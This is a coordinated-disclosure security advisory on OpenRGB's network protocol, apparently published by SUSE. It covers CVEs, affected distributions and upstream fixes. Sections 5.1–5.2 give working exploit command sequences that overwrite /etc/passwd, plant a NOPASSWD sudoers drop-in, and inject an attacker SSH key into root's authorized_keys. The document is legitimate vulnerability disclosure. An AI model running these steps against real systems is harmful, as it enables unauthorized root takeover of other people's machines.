---
layout: post
author: <a href='mailto:matthias.gerstner@suse.de'>Matthias Gerstner</a>, <a href='mailto:filippo.bonazzi@suse.com'>Filippo Bonazzi (editor)</a>
title:  "OpenRGB: Remote System Compromise via Custom Network Protocol"
date:   2026-08-25
tags:   CVE remote
excerpt: "OpenRGB is a cross-platform software suite for controlling RGB LED
devices. Our review of a custom network protocol implemented in OpenRGB
uncovered a range of high-severity security issues that can lead to a trivial
full remote system compromise, among others."
---

Table of Contents
=================
{:.no_toc}

* ToC
{:toc}

1) Introduction
===============

[OpenRGB][upstream:website] is a cross-platform software suite for controlling
RGB LED lighting devices on Linux, MacOS and Windows. It caught our
attention due to a new systemd service which appeared in the openSUSE
Tumbleweed OpenRGB package, containing the following configuration:

```sh
[Service]
ExecStart=/usr/bin/openrgb --server --config /etc/openrgb
Restart=always
RuntimeDirectory=openrgb
WorkingDirectory=/run/openrgb
```

The daemon runs with full root privileges. A quick investigation showed that
it also implements a TCP networking protocol listening on wildcard IP address
"0.0.0.0" port 6742 by default. Due to these high-risk properties we scheduled
a [detailed security review][bug:audit] of the service. During the review we
found various security issues in the protocol which can even lead to a full
remote system compromise ([issue 5.2][section:issue-system-compromise]).
Upstream [release 1.0rc3-hotfix][release:1.0rc3-hotfix] addresses the worst
aspects of the flaws discussed in this report.

The next sections provide an overview of the technical details in OpenRGB and
its network protocol. [Section 4)][section:reproducer] points out a reproducer
script we offer. [Section 5)][section:issues] describes the security issues in
detail. [Section 6)][section:concerns] discusses further security concerns we
found in the codebase of OpenRGB. In [section 7)][section:suggestions] we
provide additional hardening recommendations for the project. [Section
8)][section:affected-versions] looks into the affected OpenRGB releases while
[section 9)][section:affected-distros] gives an overview of affected Linux
and BSD distributions. In [section 10)][section:cves] CVE assignments for the
issues in this report are discussed. Finally [section 11)][section:bugfixes]
covers the bugfixes provided by upstream to address the issues in this report.

This report is based on upstream release tag
[release\_candidate\_1.0rc3][release:1.0rc3].

2) Overview of OpenRGB
======================

OpenRGB is implemented in C++ and consists of about 350,000 lines of code.
It ships a single executable `openrgb` which implements three different
personalities:

- a graphical UI application implemented in Qt which allows to control and
  inspect various aspects of OpenRGB.
- a client personality which is used to query state from or modify an already
  running server instance of `openrgb`.
- a server personality which implements a custom network protocol listening on
  wildcard IP "0.0.0.0" port 6742 by default. Only default-enabled firewalls
  prevent attack surface exposed by the service from becoming immediately
  accessible to remote attackers. Local users can always connect to the daemon via
  `localhost`. In server mode the daemon collects information about LED devices
  and stores their state in memory. The network protocol allows to retrieve
  information about the current devices and daemon state as well as to modify
  certain aspects of the daemon configuration.

3) Overview of the Network Protocol
===================================

Each OpenRGB network message starts with [a `NetPacketHeader` of 16 bytes
size][code:header]. This header most prominently defines the operation to be
carried out (`pkt_id`) and the length of the payload following the header
(`pkt_size`). The available network messages are declared via [`NET_PACKET_ID`
enum constants][code:message-ids]. The server-side parsing logic is located in
[`NetworkServer::ListenThreadFunction()`][code:listen-thread].

Different versions of the protocol have evolved over time. The protocol
version in use can be reported by the client via the
`NET_PACKET_ID_REQUEST_PROTOCOL_VERSION` message, but is inconsistently also
sometimes embedded into the payload data of specific message types. When the
version is not reported by a client then it is treated as 0 on the
server-side; the current protocol version is 5. The structure of the message
payload is highly context-dependent; exact sequences of integer/string values
conforming to the message type and protocol version in effect must be
used.

There exists no well-defined protocol data type specification; the common
pattern seems to be that most of the time 4-byte signed/unsigned integers,
2-byte unsigned short integers and strings are utilized. In some message types
where only a single string is found in the payload, the string length is
identified by the payload length in the header. Otherwise strings start with a
2-byte string length unsigned short integer.

There is no authentication or authorization existing on protocol level, which
means that anybody reaching the daemon can perform all operations it offers.
Generally there exists little verification of input data: there are no checks
against overly large messages and resulting memory allocations, scarce checks
for valid and sufficient input data, allowing memory corruption, and there is
no validation of logical operations that are carried out e.g. on the file
system as a result of client requests. Even where length information is
available in the protocol and parsed by the server, it is sometimes discarded
and raw network data is instead passed e.g. to `std::string` objects, assuming
proper null termination of client-provided strings.

{: #reproducer}
4) Reproducer Script
====================

We offer a [tarball for download][download:reproducer] containing a Python
script, two symlinks pointing to it and a test configuration file. The script
can act as an OpenRGB network client as well as a network server, and
implements parts of the protocol for the purposes of reproducing the security
issues discussed further below. We will point out specific reproducer command
lines based on this script over the course of this report.

{: #issues}
5) Security Issues
==================

{: #issue-file-overwrite}
5.1) Arbitrary File Overwrite via `SAVE_PROFILE` Message (CVE-2026-59682)
-------------------------------------------------------------------------

The [`SAVE_PROFILE` message][code:save-profile] causes the OpenRGB server to
store its current profile data in a local file path. There is no verification
of the path passed by the client, allowing it to point to arbitrary locations
on the file system. When the daemon runs with full `root` privileges, as
suggested by the OpenRGB systemd service unit, then arbitrary new files can be
created or existing files can be overwritten. The profile save logic truncates
the specified file if it exists, and writes the profile data into it.

This serves as a simple Denial-of-Service attack vector which allows to
completely break the system. There is no precondition to reaching
this outcome, it works even if the daemon is unconfigured and no LED devices
exist in the system.

One apparent obstacle to this attack is that a filename extension [is always
added to the path][code:profile-extension] passed by the client. Local
attackers can easily bypass this by placing a symbolic link into the file
system which contains the expected filename extension, which will be followed
by the OpenRGB file handling code. Even remote attackers can overcome this
limitation due to the way the string is parsed for this message type:

```cpp
std::string profile_name;
profile_name.assign(data, header.pkt_size);
```

In most other message types in OpenRGB, string assignment is null-terminator
based; in this case the raw input data is assigned to a `std::string` instead.
This means the string can even contain null-terminators (the `std::string`
object explicitly supports such use cases). The Linux kernel's file system
calls are always null-terminator oriented, however. When an attacker passes a
filename like `/etc/fstab\0\0\0suffix`, the server will still append the
filename extension to the string, but once it is passed to system calls, the
kernel will only create the file `/etc/fstab`, stopping at the first
null-terminator.

By applying this technique, both local and remote attackers can overwrite
arbitrary files on the affected system. The attached reproducer script can be
invoked as follows to reproduce the issue:

```sh
# this will overwrite /etc/passwd when OpenRGB is running on localhost
user$ ./rgb_fake_client.py --save-profile /etc/passwd
```

Note that `openrgb` actually intends to write the file into its "configuration
directory", which is looked up in
[`ResourceManager::SetupConfigurationDirectory()`][code:setup-config-dir].
When the server is started via the systemd service unit, however, none of the
environment variables inspected by the function are present. As a result the
fallback configuration directory of `"./"` is used, which will simply be `/`
in the context of the systemd service. Even if a proper configuration
directory would be set, clients can easily bypass it by prefixing `../`
directory components to reach the root of the file system.

### Suggested Fix

All file-related messages like `LOAD_PROFILE`, `SAVE_PROFILE` and
`DELETE_PROFILE` should be restricted to a fixed directory that is only
controlled by the daemon itself. Path components like `/` and `..` in the
passed filename should be rejected. Similarly, non-printable characters (like
terminal control sequences) should not be accepted. Even with these
precautions there should be some mechanism to avoid creation of an unlimited
amount of saved profiles, which could lead to disk space exhaustion.

{: #issue-system-compromise}
5.2) Remote and Local Root Exploits via `UPDATEMODE` and `SAVE_PROFILE` Messages (CVE-2026-59683)
-------------------------------------------------------------------------------------------------

The [`UPDATEMODE` message][code:update-mode] allows to alter the configuration
of any registered LED controller in OpenRGB. This message is rather complex,
consisting of multiple dynamically-sized arrays and also containing a
variable-length string used as a "mode description" label. This
attacker-controlled string combined with the `SAVE_PROFILE` attack vector
described [in section 5.1)][section:issue-file-overwrite] paves the way for
full local and even remote root exploits. Other message types that contain
attacker-controlled strings might be usable for this attack as well, we
arbitrarily chose this message type to demonstrate the attack.

The only precondition to this attack is that OpenRGB must have detected at
least one LED controller to operate on. An empty configuration in OpenRGB will
not expose any code paths that allow to store an attacker-controlled string
in the profile written out by `SAVE_PROFILE`. We also found no way to trigger
the registration of fake or emulated LED devices via the networking protocol.
If OpenRGB is already running on a system then the typical situation will be
that an actual LED controller is registered, however, meaning that the attack
is relevant for most practical scenarios.

For reproducing this attack it is useful to configure a debug LED controller
in OpenRGB, avoiding the need to have any real LED hardware present on the
test system. The [reproducer tarball][download:reproducer] contains the
configuration file `emul.json` which can be used as `OpenRGB.json` by the
OpenRGB service. This configuration will expose a test LED device which is
sufficient to trigger the exploit.

The attacker-controlled string stored in the OpenRGB profile as "mode
description" will be written out to the file passed to the `SAVE_PROFILE`
message. The attacker does not control the full content of the output file,
which will be a binary file containing various other data serialized by
the OpenRGB daemon. The string can be of arbitrary length, however, and can
contain any characters except for null bytes. This allows the attacker to
inject a range of valid text lines which will be interpreted by programs that
otherwise ignore syntax errors found while parsing the file.

One privileged program which fulfills the criteria is `sudo` when parsing
`sudoers` files; this can be instrumented to turn the vulnerability into a
local root exploit. The following example demonstrates this based on the
provided reproducer script:

```sh
# construct a line which will grant us root privileges via `sudo` without
# entering a password
user$ SUDOERS_LINE=$(echo -e "\n\n$USER ALL=(ALL) NOPASSWD: ALL\n\n")

# this will store the line in the testing device's mode description
user$ ./rgb_fake_client.py --update-mode-name "0:0:$SUDOERS_LINE"
> Connected to ('localhost', 6742)
> Sent update for mode name, len = 97

# verify the intended line is actually part of the controller profile by now
user$ ./rgb_fake_client.py --req-controller-data 0 | grep NOPASSWD
> 'name': '\n\nuser ALL=(ALL) NOPASSWD: ALL',

# now ask the daemon to store the profile data in a /etc/sudoers.d drop-in
# configuration file
user$ ./rgb_fake_client.py --save-profile /etc/sudoers.d/letmein
> Connected to ('localhost', 6742)
> Saved profile to /etc/sudoers.d/letmein

# by now we should be able to gain root
user$ sudo su -
> /etc/sudoers.d/letmein:1:16: syntax error
> OPENRGB_PROFILE
> <snip>
localhost:~ #
```

To turn this vulnerability into a remote root exploit, the only requirement is
that `sshd` is running and accessible on the target host. What we will do is
inject our own SSH public key into the victim's `/root/.ssh/authorized_keys`:

```sh
# create a new SSH keypair using an empty passphrase
user$ ssh-keygen
> Generating public/private ed25519 key pair.
> Enter file in which to save the key (/home/user/.ssh/id_ed25519):
> Enter passphrase for "/home/user/.ssh/id_ed25519" (empty for no passphrase):
> Enter same passphrase again:
> Your identification has been saved in /home/user/.ssh/id_ed25519
> Your public key has been saved in /home/user/.ssh/id_ed25519.pub
> The key fingerprint is:
> SHA256:r3SONks2o9FkN10IKW4sz3yYBdptLVOVeuzZOsVwnIw user@attack-host

# embed the new SSH public key in a shell variable surrounded by newlines
user$ PUBKEY_LINE=$(cat .ssh/id_ed25519.pub)
user$ PUBKEY_LINE=$(echo -e "\n\n$PUBKEY_LINE\n\n")

# the remote host running OpenRGB to attack
user$ ORGB_HOST="victim-host"

# store the public key as "mode description" in the victim's OpenRGB daemon
user$ ./rgb_fake_client.py --host $ORGB_HOST --update-mode-name "0:0:$PUBKEY_LINE"
> Connected to ('192.168.178.28', 6742)
> Sent update for mode name, len = 156

# verify the public key is now contained in the profile
user$ ./rgb_fake_client.py --host $ORGB_HOST --req-controller-data 0 | grep ssh-
>         'ssh-ed25519 '

# now write out the "profile" into the desired location via `SAVE_PROFILE`
user$ ./rgb_fake_client.py --host $ORGB_HOST --save-profile /root/.ssh/authorized_keys
> Connected to ('192.168.178.28', 6742)
> Saved profile to /root/.ssh/authorized_keys

# by now we should be able to login as root via SSH
user$ ssh root@$ORGB_HOST
> Last login: Thu Jul 30 11:35:08 CEST 2026 from 192.168.178.56 on ssh
> Have a lot of fun...
localhost:~ #
```

Even without `sshd` running there exist other possibilities to gain full
remote code execution, such as by overwriting scripts in privileged locations;
the only downside to this approach is that the effect of the attack will
usually not be immediate, but will only take place once a privileged program
executes the crafted script.

### Suggested Fix

The most important part to fixing this potential remote root exploit is
fixing security issue [5.1)][section:issue-file-overwrite]. Once arbitrary
files cannot be overwritten any longer, the attack will be thwarted.
Furthermore, any string data supplied by clients needs to be restricted in
length and content. There should be no newlines, control characters or other
special characters in the string data.

{: #issue-memory-handling}
5.3) Various Denial-of-Service Attack Vectors (CVE-2026-18794)
--------------------------------------------------------------

There are various ways to achieve Denial-of-Service against the `openrgb`
daemon and the system it is running on:

- The [packet header][code:header] allows to send a payload of up to 4
  gigabytes in length. The daemon's code will happily allocate on the heap any
  payload announced by the client; the client doesn't even need to send
  the actual payload. The daemon also supports up to 32 parallel client
  connections which will be handled in dedicated threads. This means a malicious
  client can trigger up to 128 gigabyte of memory allocation in `openrgb`,
  leading to memory exhaustion which might also affect other programs on the
  system. This can be reproduced by calling `rgb_fake_client.py
  --send-large-messages`.
- The data sent by clients is only partially validated for integrity. For
  example, strings that are not null-terminated can lead to a crash in
  `openrgb`, when the data is passed to a `std::string` object. Similarly,
  overly large array size entries or truncated data structures can lead to
  memory access violations in the daemon. Most of this concerns invalid read
  accesses, but there also linger some invalid write access issues with the
  potential for stack/heap corruption, opening up further, more complicated
  attack vectors for privilege escalation.
- The [`LOAD_PROFILE` message][code:load-profile] (analogous to [issue
  5.1][section:issue-file-overwrite]) allows to point the daemon to arbitrary
  file system locations for parsing new profile data from. This can also lead
  to memory exhaustion or to blocking the thread forever (e.g. by pointing it to
  a named FIFO pipe or parsing of corrupted data which can again trigger the
  memory management issues described above).
- The `DELETE_PROFILE` message allows to delete arbitrary files in the system
  based on the same approach as pointed out in [issue
  5.1][section:issue-file-overwrite]) for `SAVE_PROFILE`. This can be
  reproduced via `rgb_fake_client.py --delete-profile /path`.
- We observed the daemon crashing sometimes because it was sent `SIGPIPE` by
  the kernel when attempting to write to a client socket that is no longer
  connected. The error is not easy to reproduce, but the daemon should ignore
  `SIGPIPE` in any case to prevent such crashes.

Many of these issues also affect the client-side logic of `openrgb`. Since
there is no authentication in the protocol, there is no telling whether the
peer is a trustworthy OpenRGB instance, and unexpected replies can crash the
client as well.

### Suggested Fixes

These issues are hard to fix since they are spread all over the network
processing logic. OpenRGB needs to enforce sensible size limits for messages
and must carefully scrutinize all input on client and server side to avoid any
memory corruption and invalid memory accesses.

{: #concerns}
6) Other Concerns
=================

6.1) Server Attempts to Act as a Client
---------------------------------------

When the `openrgb --server` instance is started, for some reason it first
attempts to automatically connect to another server, acting as a client. The
`tryAutoConnect` setting for this is found [in the `ResourceManager`
class][code:try-auto-connect] and is set to `true` by default. As a result the
`ResourceManager::InitCoRoutine()` calls
[`AttemptLocalConnection()`][code:attempt-local-conn]. This causes the daemon
to attempt a connection to `localhost` port 6742, the very same port the
server is supposed to bind and listen to.

Unprivileged local users are allowed to bind to port 6742, which can cause
the OpenRGB server to talk to possibly malicious instances of OpenRGB. The
daemon performs a longer message exchange acting as a client, requesting
information about known devices from the supposed server. Due to this, the
various attack vectors present in the networking protocol as outlined in
[section 5.3)][section:issue-memory-handling] are exposed to local
unprivileged clients as well.

If the daemon manages to successfully obtain information from the "other
server" then startup won't continue normally, because the server now attempts
to keep the client connection alive while binding to wildcard IP "0.0.0.0"
port 6742 at the same time. The latter will fail, naturally, if another
process is already listening on this port on localhost. Otherwise this would
have been an interesting attack vector to inject arbitrary LED controller
information into the OpenRGB daemon even with no real LED controller hardware
being available and without having control over the `OpenRGB.json`
configuration file.

We are not sure what the intended purpose of this "auto connect" logic is in
the context of `openrgb --server`. When using the default configuration values
this does not seem to make sense, and only adds additional complexity
and attack surface. If this auto connect feature would reach an actual remote
server, then this would grant unverified third parties control over the
configuration of OpenRGB running in server mode.

In the [reproducer tarball][download:reproducer] we also provide a partial
implementation of the OpenRGB server protocol. It can be started via
`rgb_fake_server.py --send-bad-controller-data`. When the real `openrgb
--server` is started while the fake server is running, various forms of
corruption will occur in `openrgb`, ranging from excess memory allocation to
memory corruptions which lead to core dumps.

6.2) Lack of Network Byte Order Handling
----------------------------------------

The serialized data sent by `openrgb` in network messages is always in host
byte order. This seems a strange choice, since OpenRGB is a cross-platform
project. It would be impossible to successfully exchange data between two
hosts using a different byte order or simply differently sized `int` types,
for example.

The usual approach to this is to send all data in "network byte order",
creating a defined data type representation on the wire.

6.3) Plugin Support Further Expands Attack Surface
--------------------------------------------------

OpenRGB supports plugins which can extend its functionality. Luckily plugins
cannot be loaded via the network API, instead they seem to be configured via
the [Qt GUI component only][code:gui-plugins]. The UI asks the user to select a
binary plugin to "install" into OpenRGB. We are not completely sure what the
supposed workflow is for this, since regular users won't be able to install a
plugin this way for a system-wide privileged daemon, for example. If the plan
is to run the GUI application as `root` then this would be even more worrying.

Loading arbitrary binary plugins selected by the user is an invite to e.g.
run code downloaded from the Internet without verifying signatures, which
would be very unusual and dangerous for a Linux system. A crafted plugin would
lead to immediate code execution in the context of the user running the Qt UI.

Once plugins are installed in OpenRGB they can be reached via the network
using the [`PLUGIN_SPECIFIC` message][code:plugin-specific]. This calls into
plugin-specific code and is thus beyond the scope of this review. Depending on
what a plugin actually does this could easily open up additional attack
vectors, however.

6.4) Vast Range of LED Controllers Expands Attack Surface
---------------------------------------------------------

The [`Controllers` sub-directory][code:controllers] currently contains 189
different classes for device-specific support. The code in these files amounts
to about 270,000 lines of code. These device-specific classes partially
override virtual functions that are also reachable via the network protocol,
creating an incalculable amount of code possibly exposed to the network.

It would be helpful to clearly separate code paths that are only called
internally from those which might also be called from the network. Clearly
marking possibly untrusted arguments or scrutinizing input data before passing
it on to specialized code should be considered. Ideally some redesign would
avoid network-related calls into non-core code in the first place.

{: #suggestions}
7) Further Suggestions
======================

7.1) systemd Service Hardening
------------------------------

Currently the [systemd service unit][code:system-service] runs the OpenRGB
server with full root privileges without any hardening options in effect.
systemd offers various features to apply sandboxing even to otherwise
privileged processes. This would allow to prevent e.g. modification of files
outside of expected locations by using the `ReadWritePaths=` directives and
similar settings.

This should only be considered additional hardening for situations when things
turn bad; it is not a first line of defense for a network-exposed service.

7.2) Dropping Privileges
------------------------

For the scenario of the OpenRGB server running as `root` it could be
considered to drop privileges for most of the time to avoid unnecessary
exposure. We assume the main reason for having root privileges is the ability
to modify LED hardware controls, thus the daemon could by default drop
privileges to some `openrgb` service user and only raise privileges for the
few situations when they are actually needed.

Another approach could be to separate the daemon into two programs, one
privileged and offering only the hardware-specific API, and another
unprivileged, bridging between network clients and the privileged daemon.

7.3) Mutual Authentication
--------------------------

Currently OpenRGB uses an unencrypted and unauthenticated protocol which seems
to be intended to operate on real networks. For this scenario it is highly
advisable to at least offer the option to introduce mutual authentication e.g.
via SSL certificates. This would also allow to introduce encryption. While
most of the data transferred by OpenRGB does not look sensitive at first
sight, the situation might change in the future.

7.4) Applying Safe Defaults
---------------------------

The `openrgb --server` instance should not by default attempt to bind to the
wildcard address `0.0.0.0` and thus potentially become available to remote
parties. Doing this should be an explicit decision by the system administrator
via a corresponding configuration entry.

{: #affected-versions}
8) Affected OpenRGB Versions
============================

Most of the security issues outlined in this report have likely been present
in various forms for a long time in OpenRGB. We verified that all of them can
be reproduced in the current OpenRGB release candidates starting from [1.0
rc1][release:1.0rc1], which was released in early 2025. All Linux
distributions we looked into already package this or a newer version. On some
distributions like Arch, Fedora and Ubuntu, the `openrgb` binary reports
versions like "0.9+", indicating that a development snapshot is used.

The current stable version of OpenRGB is [version 0.9][release:0.9], which was
released back in 2023. The long time since the last stable release is probably
the reason why many Linux distributions package development snapshots by now.

There is one major difference between the version 0.9 stable release and the
release candidate snapshots of OpenRGB: the trivial remote root exploit
([issue 5.2][section:issue-system-compromise]) is not possible in version 0.9,
because null terminators embedded in the profile path are not copied into the
`std::string` object. The problematic call to `std::string::assign()` was only
added in [commit d7ed55b264d][commit:profile-assign], which first appeared in
release [1.0rc1][release:1.0rc1].

The [systemd service file][code:system-service] which suggests to run `openrgb
--server` as `root` was added to release candidate tag [1.0
rc2][release:1.0rc2] of OpenRGB.

In summary, OpenRGB release candidate tags starting with 1.0rc1 are fully
affected by the issues in this report. The stable release 0.9 (and likely
older versions) are not affected by trivial remote exploits, because a file
extension is always added to the `SAVE_PROFILE` path. These versions are still
affected by local root exploits (based on symlink attacks) and remote
Denial-of-Service.

{: #affected-distros}
9) Affected Systems
===================

9.1) Linux Distributions
------------------------

We looked into common Linux distributions and found the following situation:

- Arch Linux packages version 1.0rc3 of OpenRGB and is fully affected by the
  issues. Arch Linux has no firewall active by default, so it's pretty easy to
  end up with a vulnerable system here.
- Fedora Linux provides a package based on version 1.0rc2 of OpenRGB and is
  thus fully affected by the issues.
- Gentoo Linux currently provides a stable ebuild for version 1.0rc2 of
  OpenRGB and is thus fully affected, also not protected by a firewall by
  default.
- openSUSE Tumbleweed ships a version of OpenRGB based on 1.0rc2. This package
  is fully affected by the issues in this report.
- Ubuntu 26.04 LTS (just recently released) packages version 0.9+, likely
  based on version 1.0rc1 of OpenRGB. Earlier Ubuntu 24.04 LTS does not ship
  it. The package does not contain a `openrgb` system service, but only a
  systemd user service. If a regular user starts up this service in an
  unprivileged context then the issues from this report are still exploitable,
  but naturally limited to the privileges of the victim user. The user's
  `authorized_keys` can be overwritten the same way as for `root`, making it
  possible to access the user's account remotely.

9.2) BSD Distributions
----------------------

Only FreeBSD provides a package of OpenRGB; it is based on version 0.8 of
OpenRGB. The server only binds to localhost in this version, thus there is no
remote attack surface by default. Also embedded null terminators in profile
names are not copied into the target path, which means only local symlink
attacks allow full privilege escalation.

9.3) Other Systems
------------------

It is likely that the MacOS and Windows ports of OpenRGB are similarly
affected, but we did not look into them.

{: #cves}
10) CVE Assignments
==================

Upstream provided no additional input regarding CVE assignments. Therefore we
assigned CVEs as follows:

- CVE-2026-59682 ([Issue 5.1][section:issue-file-overwrite]): Arbitrary File
  Overwrite (and in extension, deletion via `DELETE_PROFILE`). In isolation
  this is a major local and remote Denial-of-Service attack vector. In OpenRGB
  <= 0.9 only local attackers can overwrite arbitrary files via symlink
  attacks. In versions > 0.9 also remote attackers can overwrite arbitrary
  files.
- CVE-2026-59683 ([Issue 5.2][section:issue-system-compromise]): Local and remote
  root exploits by combining issue 5.1) and attacker-controller strings in LED
  profile data. This is only possible in OpenRGB > 0.9.
- CVE-2026-18794 ([Issue 5.3][section:issue-memory-handling]): Cumulative local
  and remote Denial-of-Service attack surface mostly affecting OpenRGB itself
  and system memory consumption; possibly offers more complex privilege
  escalation attack vectors by way of skillful memory corruption. This affects
  OpenRGB >= 0.9, likely also a range of older versions.

{: #bugfixes}
11) Upstream Bugfixes
=====================

Initially upstream did not intend to publish bugfixes as a response to this
report, although we offered coordinated disclosure. In the course of the
communication with upstream and after we reached out to the [distros mailing
list][distros-mailing-list] for pre-disclosure, upstream decided to [publish a
minimal bugfix release][release:1.0rc3-hotfix] after all. [Commit
d2dd9dcc7][commit:hotfix] addresses the worst aspects of the flaws discussed
in this report:

- the daemon will only listen on localhost by default, not on potentially
  remote networks.
- pathnames passed to API endpoints like `SAVE_PROFILE` are no longer allowed
  to contain slashes and other special characters, preventing an escape from
  the set configuration directory.
- hardening directives have been added to the `openrgb` systemd service.
- a maximum message size is enforced.

This will avoid trivial remote or local root exploits, but it is still missing
out on a lot of the other aspects discussed in this report. We don't recommend
running OpenRGB in real networks even with this patch applied.

12) Timeline
============

|2026-07-29|We reached out to the main developer and owner of the OpenRGB GitLab repository asking for a security contact.|
|2026-07-30|We were informed that the email contact was the suitable channel. Thus we forwarded a comprehensive report on the issues this way, offering coordinated disclosure.|
|2026-07-30|Upstream explained that many of the issues would already be fixed by the version 1.0 release still under development. Upstream expressed that OpenRGB is just a spare time project and there would be no intention to provide backports of bugfixes to existing stable versions. We did not get an answer regarding coordinated disclosure or CVE assignments.|
|2026-07-31|The upstream author provided additional details about the current situation on the 1.0 development branch and which mitigations for the security issues are already in place.|
|2026-07-31|We asked for a response to our questions regarding coordinated disclosure and CVE assignments. We suggested an embargo period of about 2 weeks until Mid-August. This would have allowed us to pre-disclose the issues to the [distros mailing list][distros-mailing-list] while upstream could have prepared some form of security release addressing at least the trivial remote and local root exploits.|
|2026-08-05|We received no further response from upstream, so we wrote another follow-up email explaining that coordination of the publication of the report and a security release would be very helpful in light of the severity of the issues. We asked for a response until 2026-08-07 lest we pre-disclose to the distros mailing list on our own terms.|
|2026-08-05|Upstream replied pointing out some further technical details about bugfixes to the issues. Upstream mentioned that a version 1.0 release containing some of the security fixes would be ready in about a month. There was still no clear reply regarding coordinated disclosure; we were told that we should take care of coordinated disclosure and CVE assignment on our own.|
|2026-08-06|While we are naturally willing to help in organizing coordinated disclosure, we cannot decide on any time frames for a non-disclosure period which has to be followed by upstream. Thus we again asked upstream to give a clear reply if a non-disclosure period is desired and provided some additional advice about things to consider in this matter.|
|2026-08-06|We assigned CVEs for the issues as outlined in this report.|
|2026-08-11|Without a reply from upstream we decided to approach the distros mailing list to pre-disclose this information. We also developed and shared a set of patches against various release tags of OpenRGB to fix at least the trivial local and remote root exploits.|
|2026-08-12|A publication date of 2026-08-25 was established with the distros mailing list.|
|2026-08-12|We shared the patch set, publication date and CVE assignments with upstream to keep them in the loop.|
|2026-08-16|After a longer period of silence upstream informed us that they would be publishing bugfix releases after all, based on the patches we shared with them. The publication should happen on the weekend of August 22/23, because they had no other time slots for this purpose.|
|2026-08-18|We informed the distros mailing list that upstream plans to publish bugfix releases prior to the established CRD on 2026-08-25. Due to this we considered publishing earlier on our end on 2026-08-24 to better match the upstream release schedule.|
|2026-08-24|We noticed [upstream release 1.03rc3-hotfix][release:1.0rc3-hotfix] which contains [a minimal bugfix][commit:hotfix] of the worst issues discussed in this report. The commit documented the CVEs, but otherwise no detailed description of the security issues was to be found. Thus we decided to stick to the original publication date of 2026-08-25 for the full report.|
|2026-08-25|Publication of this report.|

13) References
==============

- [OpenRGB website][upstream:website]
- [OpenRGB GitLab project][upstream:repo]
- [openSUSE review bug for OpenRGB][bug:audit]
- [reproducer tarball for download][download:reproducer]
- [OpenRGB 1.0rc3-hotfix bugfix release][release:1.0rc3-hotfix]

[download:reproducer]: /download/openrgb-exploit.tar.gz
[upstream:repo]: https://gitlab.com/CalcProgrammer1/OpenRGB
[upstream:website]: https://openrgb.org
[commit:profile-assign]: https://gitlab.com/CalcProgrammer1/OpenRGB/-/commit/d7ed55b264dee40f68e7a17c11eaa8f1b56d8dc6
[commit:hotfix]: https://gitlab.com/CalcProgrammer1/OpenRGB/-/commit/d2dd9dcc7369e78f47d01ace19af3750cd89ae66
[release:0.9]: https://gitlab.com/CalcProgrammer1/OpenRGB/-/releases/release_0.9
[release:1.0rc1]: https://gitlab.com/CalcProgrammer1/OpenRGB/-/releases/release_candidate_1.0rc1
[release:1.0rc2]: https://gitlab.com/CalcProgrammer1/OpenRGB/-/releases/release_candidate_1.0rc2
[release:1.0rc3]: https://gitlab.com/CalcProgrammer1/OpenRGB/-/releases/release_candidate_1.0rc3
[release:1.0rc3-hotfix]: https://gitlab.com/CalcProgrammer1/OpenRGB/-/releases/release_candidate_1.0rc3.1
[code:header]: https://gitlab.com/CalcProgrammer1/OpenRGB/-/blob/release_candidate_1.0rc3/NetworkProtocol.h?ref_type=tags#L44
[code:message-ids]: https://gitlab.com/CalcProgrammer1/OpenRGB/-/blob/release_candidate_1.0rc3/NetworkProtocol.h?ref_type=tags#L57
[code:listen-thread]: https://gitlab.com/CalcProgrammer1/OpenRGB/-/blob/release_candidate_1.0rc3/NetworkServer.cpp?ref_type=tags#L567
[code:save-profile]: https://gitlab.com/CalcProgrammer1/OpenRGB/-/blob/release_candidate_1.0rc3/NetworkServer.cpp?ref_type=tags#L892
[code:profile-extension]: https://gitlab.com/CalcProgrammer1/OpenRGB/-/blob/release_candidate_1.0rc3/ProfileManager.cpp?ref_type=tags#L57
[code:update-mode]: https://gitlab.com/CalcProgrammer1/OpenRGB/-/blob/release_candidate_1.0rc3/NetworkServer.cpp?ref_type=tags#L838
[code:load-profile]: https://gitlab.com/CalcProgrammer1/OpenRGB/-/blob/release_candidate_1.0rc3/NetworkServer.cpp?ref_type=tags#L908
[code:try-auto-connect]: https://gitlab.com/CalcProgrammer1/OpenRGB/-/blob/release_candidate_1.0rc3/ResourceManager.cpp?ref_type=tags#L1757
[code:attempt-local-conn]: https://gitlab.com/CalcProgrammer1/OpenRGB/-/blob/release_candidate_1.0rc3/ResourceManager.cpp?ref_type=tags#L1780
[code:gui-plugins]: https://gitlab.com/CalcProgrammer1/OpenRGB/-/blob/release_candidate_1.0rc3/qt/OpenRGBPluginsPage/OpenRGBPluginsPage.cpp?ref_type=tags#L86
[code:plugin-specific]: https://gitlab.com/CalcProgrammer1/OpenRGB/-/blob/release_candidate_1.0rc3/NetworkServer.cpp?ref_type=tags#L938
[code:controllers]: https://gitlab.com/CalcProgrammer1/OpenRGB/-/tree/release_candidate_1.0rc3/Controllers?ref_type=tags
[code:system-service]: https://gitlab.com/CalcProgrammer1/OpenRGB/-/blob/release_candidate_1.0rc3/qt/openrgb.service?ref_type=tags
[code:setup-config-dir]: https://gitlab.com/CalcProgrammer1/OpenRGB/-/blob/release_candidate_1.0rc3/ResourceManager.cpp#L658
[section:affected-distros]: #affected-distros
[section:affected-versions]: #affected-versions
[section:concerns]: #concerns
[section:cves]: #cves
[section:issue-file-overwrite]: #issue-file-overwrite
[section:issue-memory-handling]: #issue-memory-handling
[section:issues]: #issues
[section:issue-system-compromise]: #issue-system-compromise
[section:reproducer]: #reproducer
[section:suggestions]: #suggestions
[section:bugfixes]: #bugfixes
[bug:audit]: https://bugzilla.suse.com/show_bug.cgi?id=1269523
[distros-mailing-list]: https://oss-security.openwall.org/wiki/mailing-lists/distros
